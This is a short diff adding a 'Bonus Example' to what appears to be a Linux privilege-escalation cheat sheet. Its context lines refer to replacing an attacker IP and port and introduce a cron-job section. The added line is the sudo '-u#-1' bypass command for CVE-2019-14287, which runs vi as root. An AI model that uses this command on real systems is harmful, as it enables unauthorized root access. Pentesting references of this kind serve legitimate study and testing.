@@ -645,6 +645,10 @@ id && whoami
 
 // Replace Attacker IP & Port
 ```
+Bonus Example
+```
+sudo -u#-1 /usr/bin/vi /home/user/text.txt //don't forget to try CVE-2019-14287
+```
 # Cron Tabs & Scheduled Tasks
 
 Cron jobs is a time-based job scheduler in Unix-like computer operating systems. Users that set up and maintain software environments use cron to schedule jobs to run periodically at fixed times, dates, or intervals
